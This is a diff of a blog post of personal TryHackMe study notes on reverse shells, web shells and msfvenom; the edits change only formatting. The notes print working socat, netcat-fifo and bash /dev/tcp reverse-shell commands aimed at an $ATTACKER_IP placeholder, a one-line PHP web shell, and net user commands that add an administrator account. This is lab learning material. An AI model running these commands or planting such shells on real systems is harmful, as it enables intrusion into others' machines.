@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-10-28 05:00:00.000000000 Z
+date: 2021-10-28 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-10-28-tryhackme-complete-beginner.html
 author: 100007
@@ -9,8 +9,8 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-10-28</p>
-<h2 id="what-the-shell">What the Shell?</h2>
-<h3 id="socat-encrypted-shells">Socat Encrypted Shells</h3>
+<h1 id="what-the-shell">What the Shell?</h1>
+<h2 id="socat-encrypted-shells">Socat Encrypted Shells</h2>
 <p>Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate a self-signed certificate.</span>
 <span class="c">#</span>
@@ -50,14 +50,14 @@ FILE:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</spa
 <span class="c"># stderr - redirect STDERR to the attacker</span>
 <span class="c"># sigint - pass signals (Ctrl+C) through</span>
 <span class="c"># setsid - use a new session</span>
-<span class="c"># sane - use a variety of tweaks to “normalize” the</span>
-<span class="c"># terminal’s environment</span>
+<span class="c"># sane - use a variety of tweaks to "normalize" the</span>
+<span class="c"># terminal's environment</span>
 <span class="c">#</span>
 socat <span class="se">\</span>
 OPENSSL:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span>,verify<span class="o">=</span>0 <span class="se">\</span>
 EXEC:<span class="s2">"/bin/bash -li"</span>,pty,stderr,sigint,setsid,sane
 </code></pre></div></div>
-<h3 id="common-shell-payloads">Common Shell Payloads</h3>
+<h2 id="common-shell-payloads">Common Shell Payloads</h2>
 <p>Pre-compiled, statically-linked Windows binaries for red teaming can be found in /usr/share/windows-binaries.</p>
 <p>Because the <code class="language-plaintext highlighter-rouge">-e</code> switch is considered insecure (for the very reasons we’re fond of it), many UNIX-like operating systems ship a version of netcat without it. Working around this leads to the common named pipe pattern:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkfifo</span> /tmp/p
@@ -73,11 +73,11 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 <li><a href="https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html">2021-10-02 - TryHackMe: Complete Beginner</a></li>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Reverse Shell Cheat Sheet</a></li>
 </ul>
-<h3 id="msfvenom">msfvenom</h3>
+<h2 id="msfvenom">msfvenom</h2>
 <p>Definitions:</p>
 <ul>
 <li>STAGED payloads use an initial stage whose job it is to establish a reverse connection and then load the actual shell code (the second stage) into memory. This helps minimize initial payload size and evade IDS, but tends to require more specialized code. Metasploit multi/handler + Meterpreter use this approach.</li>
-<li>STAGELESS payloads are one-stop shops — basically, everything we’ve been working with outside of Metasploit falls in this bucket. Easier to work with and understand, but bulkier and more likely to trigger alarms.</li>
+<li>STAGELESS payloads are one-stop shops - basically, everything we’ve been working with outside of Metasploit falls in this bucket. Easier to work with and understand, but bulkier and more likely to trigger alarms.</li>
 </ul>
 <p>As memory scanning has become more common, staged payloads have lost some of their alure.</p>
 <p>Fortunately (unfortunately?) msfvenom will automate our reverse shell needs. It can, among other things, generate Windows executables that will set up a reverse shell for you.</p>
@@ -88,9 +88,9 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 <p>The payload (<code class="language-plaintext highlighter-rouge">-p</code>) switch takes a Metasploit payload name. Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first <code class="language-plaintext highlighter-rouge">_</code> with a <code class="language-plaintext highlighter-rouge">/</code>, so windows/x64/shell/reverse_tcp is a staged while windows/x64/shell_revers_tcp is stageless.</p>
 <p>List all available payloads using <code class="language-plaintext highlighter-rouge">msfvenom --list payloads</code>.</p>
 <p>Interestingly, Metasploit/Meterpeter shells are banned from som certification examinations. I guess because they’re just too powerful.</p>
-<h3 id="metasploit-multihandler">Metasploit Multi/Handler</h3>
+<h2 id="metasploit-multihandler">Metasploit Multi/Handler</h2>
 <p>Be sure to set the right PAYLOAD when using multi/handler!</p>
-<h3 id="webshells">WebShells</h3>
+<h2 id="webshells">WebShells</h2>
 <p>Webshells are shells that run within a webserver, typically receiving input via GET variables or a form, and outputting to the page HTML. So, the simplest (PHP) web shell might be:</p>
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="mf">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
@@ -98,13 +98,13 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 </code></pre></div></div>
 <p>Web shells are, by their nature, non-interactive.</p>
 <p>Check out /usr/share/webshells on Kali Linux for some example webshells. In general, the most capable webshells only work on UNIX-like systems. For Windows systems, webshells are normally only a stepping stone to a normal reverse shell.</p>
-<h3 id="next-steps">Next Steps</h3>
+<h2 id="next-steps">Next Steps</h2>
 <p>Adding a user on Windows (once you have access to SYSTEM or an administrator account):</p>
-<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="kd">user</span> $USERNAME $PASSWORD <span class="na">/add
-</span><span class="nb">net</span> <span class="kd">localgroup</span> <span class="kd">administrators</span> $USERNAME <span class="na">/add
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nv">$USERNAME</span><span class="w"> </span><span class="nv">$PASSWORD</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nv">$USERNAME</span><span class="w"> </span><span class="nx">/add</span><span class="w">
 </span></code></pre></div></div>
 <p>In general, you don’t want to stay in reverse-shell land any longer than you have to.</p>
-<h3 id="linux-practice-box">Linux Practice Box</h3>
+<h2 id="linux-practice-box">Linux Practice Box</h2>
 <blockquote>
 <p>Try uploading a webshell to the Linux box, then use the command: <code class="language-plaintext highlighter-rouge">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> to send a reverse shell back to a waiting listener on your own machine.</p>
 </blockquote>
@@ -113,7 +113,7 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 <p>Navigate to <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code> in Kali Linux and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.</p>
 </blockquote>
 <p>Much more comfy. I hadn’t realized before how much nicer this reverse shell is than what we typically use.</p>
-<p>Also, one big reason to want to “stabilize” a reverse shell — to get tab completion!</p>
+<p>Also, one big reason to want to “stabilize” a reverse shell - to get tab completion!</p>
 <blockquote>
 <p>Log into the Linux machine over SSH using the provided credentials. Use the <code class="language-plaintext highlighter-rouge">mkfifo</code> method to experiment with bind and reverse netcat shells.</p>
 </blockquote>
@@ -130,13 +130,13 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-li</span> &amp;&gt; /dev/tcp/<span class="nv">$ATTACKER_IP</span>/<span class="nv">$LISTENER_PORT</span> 0&gt;&amp;1
 </code></pre></div></div>
 <p>Catch it with netcat or socat.</p>
-<p>(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I <em>think</em> what’s happening here is that /dev/tcp is bidirectional “out of the box” — incoming data comes out, just as outgoing data goes in — so binding all three “core” file descriptors to it does the right thing. That, and realize that the <code class="language-plaintext highlighter-rouge">X&gt;&amp;Y</code> construct means “bind file descriptor X to file descriptor Y”, and <code class="language-plaintext highlighter-rouge">&amp;&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">2&gt;&amp;1 &gt;</code>, and <code class="language-plaintext highlighter-rouge">&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">1 &gt;</code>. So really what’s happening here is that we bind STDERR to STDOUT with and implicit <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code>, then bind STDOUT to /dev/tcp with an implicit <code class="language-plaintext highlighter-rouge">1 &gt;</code>, then bind STDIN to /dev/tcp as well with <code class="language-plaintext highlighter-rouge">0&gt;&amp;1</code>.)</p>
+<p>(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I <em>think</em> what’s happening here is that /dev/tcp is bidirectional “out of the box” - incoming data comes out, just as outgoing data goes in - so binding all three “core” file descriptors to it does the right thing. That, and realize that the <code class="language-plaintext highlighter-rouge">X&gt;&amp;Y</code> construct means “bind file descriptor X to file descriptor Y”, and <code class="language-plaintext highlighter-rouge">&amp;&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">2&gt;&amp;1 &gt;</code>, and <code class="language-plaintext highlighter-rouge">&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">1 &gt;</code>. So really what’s happening here is that we bind STDERR to STDOUT with and implicit <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code>, then bind STDOUT to /dev/tcp with an implicit <code class="language-plaintext highlighter-rouge">1 &gt;</code>, then bind STDIN to /dev/tcp as well with <code class="language-plaintext highlighter-rouge">0&gt;&amp;1</code>.)</p>
 <ul>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Reverse Shell Cheat Sheet</a></li>
 <li><a href="https://cardboard-iguana.com/notes/netcat.html">Using “netcat”</a></li>
 <li><a href="https://cardboard-iguana.com/notes/socat.html">Using “socat”</a></li>
 </ul>
-<h3 id="windows-practice-box">Windows Practice Box</h3>
+<h2 id="windows-practice-box">Windows Practice Box</h2>
 <blockquote>
 <p>Try uploading and activating the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code>. Does this work?</p>
 </blockquote>
@@ -153,8 +153,8 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 <p>The webserver is running with SYSTEM privileges. Create a new user and add it to the “administrators” group, then login over RDP.</p>
 </blockquote>
 <p>Use:</p>
-<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="kd">user</span> $USERNAME $PASSWORD <span class="na">/add
-</span><span class="nb">net</span> <span class="kd">localgroup</span> <span class="kd">administrators</span> $USERNAME <span class="na">/add
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nv">$USERNAME</span><span class="w"> </span><span class="nv">$PASSWORD</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nv">$USERNAME</span><span class="w"> </span><span class="nx">/add</span><span class="w">
 </span></code></pre></div></div>
 <p>It’s worth noting that users added via <code class="language-plaintext highlighter-rouge">net user</code> seem to bypass Windows’ password policies…</p>
 <p>It seems that xfreerdp is installed on Kali Linux, so we can connect from there.</p>
@@ -174,6 +174,6 @@ nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tm
 </blockquote>
 <p>In practice, this is going to require uploading both a simple webshell <em>and</em> the relevant msfvenom payload (it’s also possible to start the Meterpreter payloads using the RDP session fired up above, but this seems less useful).</p>
 <blockquote>
-<p>Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat — does this work?</p>
+<p>Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat - does this work?</p>
 </blockquote>
 <p>Unsurprisingly, neither version of Meterpreter works, though netcat at least catches an incoming connection in both cases.</p>
